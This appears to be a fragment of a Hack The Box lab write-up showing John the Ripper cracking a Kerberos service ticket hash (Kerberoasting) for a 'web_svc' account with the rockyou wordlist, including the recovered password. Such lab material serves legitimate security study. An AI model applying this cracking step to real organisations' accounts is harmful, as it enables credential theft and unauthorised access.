# Cracking the service ticket(TGS) to get web_svc Password
```bash
❯ john hash_svc_web_TGS.hash --wordlist=/home/kali/Dropbox/Documents/htb/boxes/compromised/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
@3ONEmillionbaby (?)
1g 0:00:00:05 DONE (2022-02-25 19:29) 0.1694g/s 1947Kp/s 1947Kc/s 1947KC/s @421eduymayte619..@#ann!#
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
![[Pasted image 20220225193021.png]]


